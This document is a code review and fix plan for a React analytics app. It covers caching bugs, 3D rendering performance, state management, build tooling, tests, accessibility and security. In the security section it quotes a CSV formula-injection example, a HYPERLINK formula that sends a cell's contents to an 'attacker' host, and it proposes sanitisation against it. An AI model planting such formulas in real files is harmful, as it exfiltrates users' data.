# Autodata v2 — Weak Points and Improvement Plan

A code review of `origin/v2`, with the underlying root cause for each issue, the
concrete fix, and — where relevant — the industry pattern that supersedes the current
approach. Every claim is anchored to a specific file. Web sources are listed at the
end.

> Severity legend: **🔴 critical** · **🟠 high** · **🟡 medium** · **🟢 polish**

---

## Executive summary

Autodata v2 ships a working product but is built on tooling and patterns that will not
scale past its current dataset sizes or its current single-developer pace.

The five issues that I would fix first, in order:

1. 🔴 **3D scatter / bar charts render one Three.js mesh per data point.** They will
   freeze or crash any browser at ~1–2 k points. Replace with `InstancedMesh`.
2. 🔴 **The Brain runs on the UI thread.** A 100 k-row CSV blocks input for several
   seconds. Move the Brain into a Web Worker.
3. 🔴 **`DataProcessor` cache key collides** for any two datasets that share row count
   and column names. This silently returns wrong results.
4. 🔴 **CSP is effectively turned off** (`unsafe-eval`, `connect-src *`, `img-src *`).
5. 🔴 **CSV/Excel ingest performs zero formula sanitisation.** A malicious cell
   containing `=cmd|...` is preserved on export and will execute in Excel.

Beyond those: CRA is officially deprecated, test coverage is ~0 %, and the codebase has
duplicate files, dead branches, and unbounded in-memory caches.

---

## 1. The Brain service

### 1.1 🔴 `DataProcessor.generateCacheKey` collides on shape

**File:** `src/services/brain/processors/DataProcessor.js`

```js
generateCacheKey(data) {
  return `${data.length}-${Object.keys(data[0]).join('-')}`;
}
```

Any two datasets with the same row count and column names map to the same key. Upload
`sales_q1.csv` then `sales_q2.csv` (same shape) and the second run returns the first
result.

**Fix.** Hash a content fingerprint, not just the shape. A cheap, collision-resistant
option is FNV-1a / xxhash over a sample plus the schema:

```js
import { xxhash32 } from 'js-xxhash';
generateCacheKey(data) {
  const schema = Object.keys(data[0] ?? {}).join('|');
  const sample = JSON.stringify(data.slice(0, 16)) +
                 JSON.stringify(data.slice(-16));
  return `${data.length}:${xxhash32(schema + sample)}`;
}
```

### 1.2 🔴 The cache and analysis pipeline run on the main thread

The `Promise.all` in `PatternDetector.analyzePatterns` *looks* parallel but it is
`Promise.all` of synchronous JavaScript — every detector ultimately runs on the same
event loop. Combined with the O(n²) numeric-pair loop at lines ~90–105
(`patternDetector.js`), 100 k rows × 30 numeric columns is on the order of 10⁷
operations and freezes the tab.

**Fix.** Move the entire Brain into a Web Worker and call it through Comlink. Pattern:

```js
// brain.worker.js
import * as Comlink from 'comlink';
import { BrainService } from './services/brain/BrainService';
Comlink.expose(new BrainService());

// hooks/useBrain.js
const worker = new Worker(new URL('../brain.worker.js', import.meta.url),
                          { type: 'module' });
const brain = Comlink.wrap(worker);
```

This is the single biggest performance win available. Web Workers + Comlink are the
established 2026 pattern for this exact problem
([guide](https://medium.com/@hrupanjan/supercharge-your-react-app-offload-heavy-tasks-to-web-workers-with-comlink-97b4b210450b)).

### 1.3 🟠 Singleton `BrainService` carries mutable state

`BrainService.js` exports a singleton with three instance `Map`s
(`analysisCache`, `suggestionHistory`, `userPreferences`). Two near-simultaneous
`processData` calls share state, and unmounted components keep the cache alive
forever.

**Fix.** Either keep the singleton but make it immutable (`Object.freeze` the public
API and store cache in a bounded LRU) or remove the singleton and let the
`useBrain` hook own its instance per component tree. The Worker move from §1.2 makes
this trivial — each Worker gets its own state.

### 1.4 🟠 Magic numbers everywhere

```js
this.settings = {
  maxDataPoints: 100000,
  minConfidenceScore: 0.6,
  maxSuggestions: 10,
  correlationThreshold: 0.5,
  patternDetectionThreshold: 0.7,
  maxInsightsPerType: 5,
  maxTotalInsights: 20,
};
```

No documentation, no rationale, no override path. Today the only way to tune is to
edit source.

**Fix.** Extract a `BrainConfig` object with JSDoc on every field, expose it through
`SettingsContext`, and persist user overrides. Then surface a "performance" panel in
the Settings view that lets users dial down `maxDataPoints` on weaker devices.

### 1.5 🟠 `MemoryManager.getAvailableMemory()` only works in Chrome

`window.performance.memory.jsHeapSizeLimit` is a Chrome-only, non-standard API. In
Firefox and Safari it returns `undefined`, the optional-chaining defaults to
`Infinity`, and every memory check passes. Mobile Safari is precisely where this matters.

**Fix.** Use `navigator.deviceMemory` (in GB) as the cross-browser primary signal and
fall back to a conservative budget per device class:

```js
const deviceMemoryGB = navigator.deviceMemory ?? 2;       // 0.25, 0.5, 1, 2, 4, 8
const heapBudget = Math.min(deviceMemoryGB * 1024**3 * 0.25, 512 * 1024 * 1024);
```

Optionally use the Memory Measurement API (`performance.measureUserAgentSpecificMemory`)
behind a feature check.

### 1.6 🟠 `DataProcessor.sampleData` produces biased and non-deterministic samples

```js
const sampledData = data.filter(() => Math.random() < sampleRate);
```

This gives a *binomial-distributed* result size — sometimes much smaller than
`recommendedSize`, occasionally empty for very small rates. Two runs of the same
dataset see different stats.

**Fix.** Use reservoir sampling (Algorithm R). Deterministic size, single pass, O(n).

### 1.7 🟠 Numeric-pair correlation loop is O(n²) over columns

`patternDetector.js:90–105` filters the entire data array inside the inner loop. For
30 columns and 100 k rows that is 30² × 100 k = 9 × 10⁷ operations — and it is
duplicated work because the per-column means and stdDevs are already computed by
`ColumnAnalyzer`.

**Fix.** Compute per-column statistics once. Compute the correlation matrix as a single
pass with the streaming Pearson formula. Skip the symmetric half (only `j > i`).

### 1.8 🟠 `ColumnAnalyzer` type detection is fragile

```js
/^-?\d*\.?\d+$/.test(value)        // rejects 1e-5, NaN, Infinity
Date.parse(value)                  // accepts almost any string
```

**Fix.** Use a pre-compiled regex that admits scientific notation
(`/^-?\d+(\.\d+)?([eE][+-]?\d+)?$/`) and validate dates with a stricter library
(`date-fns`'s `parseISO` or `Day.js` strict mode).

### 1.9 🟡 Two `columnAnalyzer.js` files

`analyzers/columnAnalyzer.js` is the rich version BrainService imports.
`analyzers/utils/columnAnalyzer.js` is a parallel, simpler copy with extra helpers
(`findRelatedColumns`, `getWordSimilarity`). They will drift.

**Fix.** Keep one. Split the unique helpers into a separate file (e.g.
`columnRelationships.js`) and delete the duplicate.

### 1.10 🟡 Stub methods masquerading as implementations

`visualizationSuggester.js`: `isSuitableForSurface() { return true; }` and several
`generate…Insights()` functions return `[]`. They give the appearance of working
features. `generateTimeSeriesInsights` is referenced but not defined — call sites
get `undefined`.

**Fix.** Either implement them or remove them. A `TODO` comment is fine but a silent
`return true` is worse than a thrown `NotImplemented` because it ships broken
suggestions to users.

### 1.11 🟡 `useBrain` hook race condition

```js
dataRef.current = data;          // updates async
// later:
analyzeData(dataRef.current);
```

If `data` changes twice before the first analysis returns, the second `analyzeData`
sees the new data, and when the first analysis resolves it overwrites state with stale
results.

**Fix.** Use an `AbortController` and pass `signal` into the Brain. Drop results from
aborted runs.

### 1.12 🟡 `DataContext` 30-second timeout leaks

```js
processingTimeoutRef.current = setTimeout(reject, 30000);
const result = await Promise.race([analysisPromise, timeoutPromise]);
```

`clearTimeout(processingTimeoutRef.current)` is not called when `analysisPromise`
wins. A long session piles up timers.

**Fix.** Use `AbortController.signal.timeout(30_000)` (Node 18+ / browsers 2024+) and
cancel both sides in `finally`.

---

## 2. Rendering and 3D performance

### 2.1 🔴 No instancing in 3D scatter / bar

**File:** `src/components/visualizations/3d/ScatterPlot3D.jsx`

```jsx
{points.points.map((point, index) => (
  <group key={index}>
    <mesh ...>
      <sphereGeometry args={[1, 16, 16]} />
      <meshStandardMaterial ... />
    </mesh>
    {hoveredPoint === point && <Html ...>}
  </group>
))}
```

Each point is a separate mesh + geometry + material. Three.js docs, the R3F
"scaling-performance" guide, and the popular `large-scale-data-scatterplot` reference
all converge on the same answer: **draw call per object is a hard ceiling around a few
hundred objects**, and beyond a few thousand it is fatal
([R3F scaling-performance](https://r3f.docs.pmnd.rs/advanced/scaling-performance) ·
[Three.js 100 tips](https://www.utsubo.com/blog/threejs-best-practices-100-tips) ·
[reference impl](https://github.com/Sejmou/large-scale-data-scatterplot)).

**Fix.** Use `THREE.InstancedMesh` for spheres / boxes, or `THREE.Points` for very
large clouds. R3F has `<Instances>` from drei to make this idiomatic:

```jsx
<Instances limit={100_000} range={points.length}>
  <sphereGeometry args={[1, 8, 8]} />
  <meshStandardMaterial />
  {points.map((p, i) => (
    <Instance key={p.id} position={p.position} color={p.color} />
  ))}
</Instances>
```

Hover detection should be done with **one raycaster on the InstancedMesh + instanceId**,
not per-point pointer events.

### 2.2 🔴 No geometry/material disposal — VRAM leak

`<sphereGeometry>` and `<meshStandardMaterial>` are JSX-created on every render and not
explicitly disposed. R3F disposes the *root* canvas on unmount, but rapid re-renders
inside a mounted canvas keep allocating.

**Fix.** Memoise the geometry/material outside the map (`useMemo` once, reused for all
instances). With instancing this is automatic.

### 2.3 🟠 `Math.min(...xValues)` blows up on big data and NaN

Spreading a 100 k-element array into `Math.min` is fine until you hit the call-stack
limit. It also returns `NaN` if any value is `NaN`.

**Fix.**
```js
let xMin = Infinity, xMax = -Infinity;
for (const v of xValues) {
  if (Number.isFinite(v)) {
    if (v < xMin) xMin = v;
    if (v > xMax) xMax = v;
  }
}
```

### 2.4 🟠 `key={index}` on mapped points

React reuses DOM nodes by key. With `index` keys, sorting or filtering the dataset
keeps stale `<mesh>` instances and breaks hover state.

**Fix.** Use a stable per-row id (`crypto.randomUUID()` once at parse time, or a hash
of the row). With instancing, the key concern goes away.

### 2.5 🟠 Canvas config recreated on any setting change

`ThreeDView.jsx` builds `canvasConfig` with `useMemo([settings])`. Toggling theme or
animation re-creates the object, which forces R3F to tear down and rebuild the WebGL
context.

**Fix.** Depend only on the specific subkeys (`settings.display.enableShadows`,
`settings.performance.pixelRatio`, `settings.camera.*`). Better: split `settings` into
narrower contexts.

### 2.6 🟡 Frameloop is always `'always'`

R3F supports `frameloop="demand"`, which renders only when something changes — perfect
for a static scatter plot.

**Fix.** Default to `frameloop="demand"` and call `invalidate()` on user interaction.

---

## 3. State management and re-render cost

### 3.1 🟠 Five nested context providers, no granularity

Every consumer of `DataContext` re-renders when `processingStatus.progress` ticks. Every
consumer of `SettingsContext` re-renders on theme toggle. The result is global re-render
cascades.

**Fix.** For *application state* (`data`, `analysis`, `currentView`), switch to
**Zustand** with selector-based subscriptions
([zustand vs context, 2026](https://medium.com/@abdurrehman1/state-management-in-2026-redux-vs-zustand-vs-context-api-ad5760bfab0b)).
Components subscribe to slices and only re-render when *that* slice changes.

For *truly static* values (theme, locale), Context stays appropriate.

### 3.2 🟠 `ChartContext.handleChartTypeChange` allocates a new `Map` per call

```js
updatePreferences(new Map([['preferredChartType', newType]]));
```

A new `Map` reference defeats every downstream `React.memo`.

**Fix.** Mutate a stable preferences object (or use Zustand's `setState`).

### 3.3 🟡 Duplicate wrapper files

`ChartsView.jsx` (file) and `ChartsView/` (directory with `index.jsx`) both exist.
`App.js` imports from the file. Same for `ThreeDView`. Maintainers will edit the wrong
one.

**Fix.** Delete the flat wrappers; let the directory's `index.jsx` be the single source
of truth.

### 3.4 🟢 `hooks/InsightsPanel.jsx` is misfiled

Components don't belong under `hooks/`. Move it to `components/insights/`.

---

## 4. Data ingest and security

### 4.1 🔴 CSP allows `unsafe-eval` and `connect-src *`

**File:** `public/index.html`

```html
<meta http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval';
  connect-src *; img-src *; style-src 'self' 'unsafe-inline';">
```

`unsafe-eval` re-enables every classic XSS payload. `connect-src *` permits exfiltration
to any origin. `img-src *` allows pixel-tracking.

**Fix.** Remove `unsafe-eval` (CRA dev mode needs it; production builds don't). Use a
nonce-based `script-src` if any inline scripts remain. Whitelist `connect-src` to the
specific API endpoints the user can configure (or `'self'` if none). For
`img-src`, `'self' data:` is enough — Recharts and Three.js do not require external
images.

Also serve CSP as an HTTP header, not a `<meta>` tag, when possible — header CSP is
strictly stronger.

### 4.2 🔴 No CSV formula injection sanitisation

`fileHandlers.js` parses with `dynamicTyping: true` and passes data straight through.
A cell containing `=HYPERLINK("https://attacker/?c="&A1,"win prize")` is preserved.
On re-export (or download as CSV) and re-open in Excel/Calc, the formula executes
([OWASP](https://owasp.org/www-community/attacks/CSV_Injection)).

**Fix.** During parse, prefix any cell starting with `=`, `+`, `-`, `@`, `\t`, `\r`
with a single quote:

```js
const SANITIZE = /^[=+\-@\t\r]/;
const sanitize = v => (typeof v === 'string' && SANITIZE.test(v)) ? `'${v}` : v;
```

Apply on read and on export. Document the behaviour so users know cells are escaped.

### 4.3 🔴 File type detection trusts client-supplied MIME

```js
const mimeType = file.type;          // user-controlled
const extension = file.name.split('.').pop();
```

Both can be spoofed. A `.exe` renamed to `.csv` with `type: 'text/csv'` is accepted
and read as text — not a code-execution risk in browser, but it leaks bytes into a
parser that wasn't designed for them.

**Fix.** Validate the first 8 bytes (the "magic number") of the file:

| Format | Magic |
|---|---|
| Excel xlsx | `50 4B 03 04` (zip) |
| Excel xls | `D0 CF 11 E0 A1 B1 1A E1` |
| JSON | start with `{`, `[`, or whitespace then `{`/`[` |
| CSV | no magic — best-effort by sniffing first line |

### 4.4 🟠 API connector loads any JSON without schema validation

`components/upload/datasource/ApiConnection.jsx` fetches the URL and passes the
response straight to `processData`. No schema check, no size limit, no auth, no
prototype-pollution guard.

**Fix.** Validate with Zod (or Yup) before processing. Cap response size (e.g. 50 MB).
Reject responses that are not arrays of objects. Strip `__proto__`, `prototype`, and
`constructor` keys.

### 4.5 🟠 Mobile cap is the same 100 MB as desktop

`MAX_FILE_SIZE = 100 * 1024 * 1024` is shared. On a phone over 4 G that is a 5–15 minute
upload, then chunked parsing on a low-memory device.

**Fix.** Branch per device class:

```js
const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
const cap = isMobile ? 10 * 1024 * 1024 : 100 * 1024 * 1024;
```

### 4.6 🟠 Mobile chunking re-parses the CSV header per chunk

`processMobileFile` slices the file into 1 MB chunks and runs `Papa.parse(chunk,
{ header: true })` on each chunk. Only the first chunk has the header; subsequent
chunks parse the header row out of arbitrary data and drop the first row.

**Fix.** Use Papa Parse's *streaming* API (`step:` callback) on the original `File`
object — it reads in chunks under the hood, sees the header once, and yields rows.

---

## 5. Tooling and build

### 5.1 🔴 Create React App is officially deprecated

CRA was sunset by the React team on 14 Feb 2025
([React blog](https://react.dev/blog/2025/02/14/sunsetting-create-react-app)). v2's
`package.json` still has `react-scripts: ^5.0.1`. No security patches, no React 19+
compatibility, no modern bundle features.

**Fix.** Migrate to **Vite**. The migration is small (CRA → Vite mappings:
`public/index.html` → root `index.html`, `process.env.REACT_APP_*` → `import.meta.env.VITE_*`,
`react-scripts start/build` → `vite/vite build`). Expected payoff: dev start under
500 ms, production bundle 30–50 % smaller after tree-shaking
([2026 migration guide](https://dev.to/solitrix02/goodbye-cra-hello-vite-a-developers-2026-survival-guide-for-migration-2a9f)).

This *also* unblocks `vite-plugin-comlink` for the Web Worker move from §1.2.

### 5.2 🟠 No code splitting beyond two `React.lazy` calls

The 3D bundle (`three`, `@react-three/fiber`, `drei`) is ~600 KB gzip. It loads even
for users who never open the 3D view.

**Fix.** Route-level `React.lazy` for `ThreeDView`, `ChartsView`, `TableView`,
`SettingsView`. Wrap with a `Suspense` boundary that shows the existing `LoadingSpinner`.

### 5.3 🟠 Source maps in production

CRA emits source maps unless `GENERATE_SOURCEMAP=false` is set. Production source maps
ship the original code to attackers.

**Fix.** `GENERATE_SOURCEMAP=false` in build env, or upload source maps privately to a
monitoring tool (Sentry).

### 5.4 🟢 ESLint config is `react-app` defaults only

No accessibility plugin (`eslint-plugin-jsx-a11y`), no import sort, no `no-floating-
promises`.

**Fix.** Adopt `eslint-config-airbnb` or `eslint-config-react-app` + `jsx-a11y` and
turn on `react-hooks/exhaustive-deps` as an error.

---

## 6. Tests

### 6.1 🔴 Test coverage is effectively zero

`App.test.js` is the CRA template:

```js
test('renders learn react link', () => { ... });
```

That phrase doesn't exist in the app. The test cannot pass; nobody runs it.

**Fix (priority order).**

1. **Pure functions** in `services/brain/utils/statisticalUtils.js`,
   `processors/DataProcessor.js`, and the analyzers — Vitest, no React, fastest
   coverage. Aim for 80 % on `services/brain/`.
2. **Hooks**: `useBrain`, `useAnalysis` with `@testing-library/react`'s `renderHook`.
3. **Components**: `DataUpload`, `DropZone`, `ErrorBoundary`. Add a smoke test for
   each top-level view.
4. **End-to-end**: Playwright — upload a sample dataset, switch to 3D, take a
   screenshot. One happy-path test catches more regressions than ten unit tests.

---

## 7. Accessibility

### 7.1 🟠 SVG charts have no ARIA / no text alternative

Recharts emits `<svg>` with no `<title>`, `<desc>`, `role="img"`, or
`aria-labelledby`. Screen-reader users get nothing
([WAI-ARIA Graphics Module / accessible SVG charts](https://www.w3.org/wiki/SVG_Accessibility/ARIA_roles_for_charts)).

**Fix.** Wrap each chart in `<figure role="figure" aria-labelledby="…" aria-describedby="…">`
with a `<figcaption>` that summarises the data. Recharts also lets you inject a custom
`<title>` via `accessibilityLayer` (added in 2.12).

### 7.2 🟠 3D canvas is keyboard- and screen-reader-inaccessible

Pointer-only orbit controls. No `aria-label` on the canvas. No alternative text view.

**Fix.** Provide an "accessible alternative" toggle that renders the same data as a
`<table>` with a textual summary of axes and ranges. Add `aria-label` to the canvas.

### 7.3 🟡 ControlPanel sliders have no labels

`<Slider>` components in `ThreeDView/ControlPanel.jsx` lack `aria-label`. Tooltips
are visual-only.

**Fix.** Add `aria-label` (or `aria-labelledby`) to every interactive control.

---

## 8. Mobile UX

### 8.1 🟠 70 vh canvas height regardless of viewport

```jsx
sx={{ height: '70vh', position: 'relative', overflow: 'hidden' }}
```

On a 6-inch phone in landscape with the address bar visible, this is ~280 px after
sidebars stack.

**Fix.** Use the responsive object form: `sx={{ height: { xs: '50vh', md: '70vh' } }}`.
Hide the ControlPanel behind a bottom-sheet drawer on `xs`.

### 8.2 🟡 No `touch-action` hint, no PWA install prompt

Touch gestures conflict with page scroll. A manifest exists but no service worker,
so the app is not installable.

**Fix.** Add `touch-action: none` to the canvas wrapper. If offline-first is wanted,
add Workbox via Vite plugin.

---

## 9. Observability

There is no logging, no error reporting, no telemetry. `reportWebVitals.js` is the CRA
default and is not wired to a backend.

**Fix.**

- **Errors**: Sentry (free tier handles ~5 k events/month). 10 lines to install.
- **Web Vitals**: send `web-vitals` v3 metrics to a `/vitals` endpoint or third-party.
- **In-product analytics**: PostHog or Plausible — cookieless, GDPR-friendly.

---

## 10. Better tools to consider for the analytics core

The Brain re-implements column profiling, correlation, distributions, and outlier
detection in plain JavaScript. There are mature alternatives that run in-browser:

### 10.1 DuckDB-Wasm + Apache Arrow

A full analytical SQL engine in WebAssembly. Arrow columnar format is 10–100× faster
than iterating arrays of objects, and the same Worker can stream Parquet from a URL
([motherduck.com / DuckDB-Wasm](https://motherduck.com/blog/duckdb-wasm-in-browser/) ·
[high-performance dashboard guide](https://medium.com/@ryanaidilp/building-a-high-performance-statistical-dashboard-with-duckdb-wasm-and-apache-arrow-d6178aeaae6d)).

What you get for free:
- `SELECT corr(a, b) FROM data` instead of hand-rolled correlation loops.
- `PIVOT` for category breakdowns.
- Streaming I/O, predicate push-down, automatic memory management.
- Up to 4 GB per Chrome tab vs the current ~100 MB practical ceiling.

**Recommendation.** Keep the Brain's *suggestion logic* (the part that decides which
chart fits) but move **statistics + aggregations** to DuckDB-Wasm. The Worker idea
from §1.2 fits naturally — DuckDB-Wasm is intended to run inside a Worker.

### 10.2 Recharts → ECharts / Visx for >10 k points

Recharts is SVG-only and starts to lag past ~5 k DOM nodes
([Querio: top React chart libs 2026](https://querio.ai/articles/top-react-chart-libraries-data-visualization),
[Syncfusion render large datasets](https://www.syncfusion.com/blogs/post/render-large-datasets-in-react)).

Pragmatic split:
- Keep Recharts for small dashboards (< 5 k points).
- Use **Apache ECharts** (canvas-rendered, dual-engine) for large datasets.
- Use **Visx** (D3 + React) when you need full custom control.

---

## Sequenced fix plan

A realistic order, with rough time estimates for one developer:

| Phase | Effort | Items |
|---|---|---|
| 1. **Stop the bleeding** | 2 days | §1.1 cache key, §2.1 InstancedMesh, §4.1 CSP, §4.2 CSV sanitisation, §4.6 CSV streaming |
| 2. **Performance** | 1 week | §1.2 Web Worker, §2.5 canvas config, §2.6 demand frameloop, §1.7 streaming Pearson |
| 3. **Tooling** | 3 days | §5.1 CRA → Vite, §5.2 code splitting, §5.3 source maps |
| 4. **Tests** | 1 week | §6.1 unit + smoke + 1 e2e |
| 5. **State refactor** | 4 days | §3.1 Zustand for data state |
| 6. **A11y + Mobile** | 3 days | §7.1–§8.1 |
| 7. **Optional analytics core** | 2 weeks | §10.1 DuckDB-Wasm |

Phases 1–3 are required before any new feature work in doc 03 will land cleanly.

---

## Sources

- [Sunsetting Create React App — react.dev](https://react.dev/blog/2025/02/14/sunsetting-create-react-app)
- [Goodbye CRA, Hello Vite (2026 guide)](https://dev.to/solitrix02/goodbye-cra-hello-vite-a-developers-2026-survival-guide-for-migration-2a9f)
- [R3F: Scaling performance](https://r3f.docs.pmnd.rs/advanced/scaling-performance)
- [100 Three.js tips that actually improve performance (2026)](https://www.utsubo.com/blog/threejs-best-practices-100-tips)
- [Three.js Instances — Codrops](https://tympanus.net/codrops/2025/07/10/three-js-instances-rendering-multiple-objects-simultaneously/)
- [large-scale-data-scatterplot reference impl](https://github.com/Sejmou/large-scale-data-scatterplot)
- [Web Workers + Comlink in React (2026)](https://medium.com/@hrupanjan/supercharge-your-react-app-offload-heavy-tasks-to-web-workers-with-comlink-97b4b210450b)
- [Web Workers, Comlink, Vite and TanStack Query](https://johnnyreilly.com/web-workers-comlink-vite-tanstack-query)
- [DuckDB-Wasm: analytical SQL in the browser](https://motherduck.com/blog/duckdb-wasm-in-browser/)
- [High-performance statistical dashboard with DuckDB-Wasm + Arrow](https://medium.com/@ryanaidilp/building-a-high-performance-statistical-dashboard-with-duckdb-wasm-and-apache-arrow-d6178aeaae6d)
- [State management in 2026: Redux vs Zustand vs Context](https://medium.com/@abdurrehman1/state-management-in-2026-redux-vs-zustand-vs-context-api-ad5760bfab0b)
- [Zustand and React Context — TkDodo](https://tkdodo.eu/blog/zustand-and-react-context)
- [Top React chart libraries 2026 — Querio](https://querio.ai/articles/top-react-chart-libraries-data-visualization)
- [Render large datasets in React — Syncfusion](https://www.syncfusion.com/blogs/post/render-large-datasets-in-react)
- [OWASP: CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)
- [PapaParse formula injection issue #793](https://github.com/mholt/PapaParse/issues/793)
- [CSV formula injection prevention — Cyber Chief](https://www.cyberchief.ai/2024/09/csv-formula-injection-attacks.html)
- [SVG Accessibility / ARIA roles for charts — W3C](https://www.w3.org/wiki/SVG_Accessibility/ARIA_roles_for_charts)
- [Accessible SVG and ARIA — data.europa.eu](https://data.europa.eu/apps/data-visualisation-guide/accessible-svg-and-aria)
